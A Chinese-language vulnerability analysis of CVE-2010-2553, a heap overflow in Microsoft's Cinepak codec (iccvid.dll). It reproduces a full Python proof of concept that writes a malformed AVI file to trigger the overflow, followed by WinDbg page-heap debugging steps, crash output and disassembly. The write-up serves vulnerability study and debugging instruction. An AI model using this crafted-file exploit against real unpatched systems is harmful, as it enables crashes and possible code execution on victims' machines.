#### 漏洞描述
微软提供有Cinepak视频编解码器（iccvid.dll）,其中CVDecompress函数在解压缩媒体文件时，由于未对缓冲区大小进行检测，导致在复制数据时造成堆溢出，利用漏洞可以造成程序崩溃或执行任意代码。
#### 分析环境

#### 基于HeapPage的堆溢出漏洞分析方法
poc如下
```
'''

  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ <
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/

http://www.exploit-db.com/moaub-26-microsoft-cinepak-codec-cvdecompress-heap-overflow-ms10-055/

'''

'''
  Title             : Microsoft Cinepak Codec CVDecompress Heap Overflow
  Version           : iccvid.dll XP SP3
  Analysis          : http://www.abysssec.com
  Vendor            : http://www.microsoft.com
  Impact            : High
  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           : @abysssec
  CVE               : CVE-2010-2553
  MOAUB Number      :
'''


import sys

def main():

	aviHeaders = '\x52\x49\x46\x46\x58\x01\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\xC8\x00\x00\x00\x68\x64\x72\x6C\x61\x76\x69\x68\x38\x00\x00\x00\xA0\x86\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x4E\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x49\x53\x54\x7C\x00\x00\x00\x73\x74\x72\x6C\x73\x74\x72\x68\x38\x00\x00\x00\x76\x69\x64\x73\x63\x76\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x4E\x00\x00\x00\x20\x74\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x20\x01\x73\x74\x72\x66\x28\x00\x00\x00\x28\x00\x00\x00\x50\x01\x00\x00\x20\x01\x00\x00\x01\x00\x18\x00\x63\x76\x69\x64\x84\x8D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	padding = '\x4A\x55\x4E\x4B\x00\x00\x00\x00\x4A\x55\x4E\x4B\x00\x00\x00\x00'
	movi_tag = '\x4C\x49\x53\x54\x5C\x00\x00\x00\x6D\x6F\x76\x69\x30\x30\x64\x63\x10\x00\x00\x00'
	cinepak_codec_data1 = '\x00\x00\x00\x68\x01\x60\x01\x20'
	number_of_coded_strips = '\x00\x10'
	cinepak_codec_data2 = '\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'
	idx_tag = '\x69\x64\x78\x31\x10\x00\x00\x00\x30\x30\x64\x63\x10\x00\x00\x00\x04\x00\x00\x00\x68\x00\x00\x00'

	avifile = open('poc.avi', 'wb+')
	avifile.write(aviHeaders)
	avifile.write(padding)
	avifile.write(movi_tag)
	avifile.write(cinepak_codec_data1)
	avifile.write(number_of_coded_strips)
	avifile.write(cinepak_codec_data2)
	avifile.write(idx_tag)

	avifile.close()
	print '[-] AVI file generated'

if __name__ == '__main__':
    main()
```

开启vmplayer.exe的页堆选项

```
gflags.exe /I vmpalyer.exe +hpa
Current Registry Settings for vmpalyer.exe executable are: 02000000
    hpa - Enable page heap

```
运行Windows Media Player，使用Windbg附加VmPlayer.exe,运行，触发异常中断到如下的地址   
```
(5cc.7a0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00006000 ebx=0a9be2f8 ecx=00000012 edx=0ab3fd38 esi=0a966000 edi=0a968000
eip=73b722cc esp=0ab3fd04 ebp=0ab3fd30 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\iccvid.dll -
iccvid+0x22cc:
73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:012> kb
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
0ab3fd30 73b7cbf3 00000004 00000000 00000068 iccvid+0x22cc
0ab3fd60 73b766c8 00121758 00000000 0013a550 iccvid!DllInstanceInit+0x6279
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\MSVFW32.dll -
0ab3fdac 73b41938 00121758 00000001 0000400d iccvid!DriverProc+0x1bf
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\quartz.dll -
0ab3fdd0 7cf8fa9e 73b5b500 0000400d 0ab3fde8 MSVFW32!ICSendMessage+0x2b
```
对上层函数进行反汇编，得到如下的汇编代码
```
:014> ub iccvid!DllInstanceInit+0x6279
iccvid!DllInstanceInit+0x625e:
73b7cbd8 ffb698000000    push    dword ptr [esi+98h]
73b7cbde 57              push    edi
73b7cbdf ff7528          push    dword ptr [ebp+28h]
73b7cbe2 ff752c          push    dword ptr [ebp+2Ch]
73b7cbe5 ff7530          push    dword ptr [ebp+30h]
73b7cbe8 ff7514          push    dword ptr [ebp+14h]
73b7cbeb ff765c          push    dword ptr [esi+5Ch]
73b7cbee e8bb55ffff      call    iccvid+0x21ae (73b721ae)
```
直接对73b7cbee函数下断点时，在打开POC.avi时并不会中断下来，因为iccvid模块是在加载avi时才会被动态加载。所以需要如下的操作。   
1：利用windbg的sxe ld:ModuleName命令在iccvid模块首次被加载时断下，然后再在73b7cbee地址处下断点。   

```
0:003> sxe ld:iccvid
0:003> g
ModLoad: 73b70000 73b87000   C:\WINDOWS\system32\iccvid.dll
eax=00000001 ebx=00000000 ecx=00000044 edx=000a2ee0 esi=00000000 edi=00000000
eip=7c92e4f4 esp=0234e28c ebp=0234e380 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiFastSystemCallRet:
7c92e4f4 c3              ret
0:003> lmm iccvid
start    end        module name
73b70000 73b87000   iccvid     (deferred)             
0:003> bp 73b7cbee
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\iccvid.dll -
0:003> g
Breakpoint 0 hit
eax=00000001 ebx=0a7ffd88 ecx=0005e2c0 edx=fffffee0 esi=0011a558 edi=0a87e860
eip=73b7cbee esp=0a7ffd38 ebp=0a7ffd60 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
iccvid!DllInstanceInit+0x6274:
73b7cbee e8bb55ffff      call    iccvid+0x21ae (73b721ae)

```
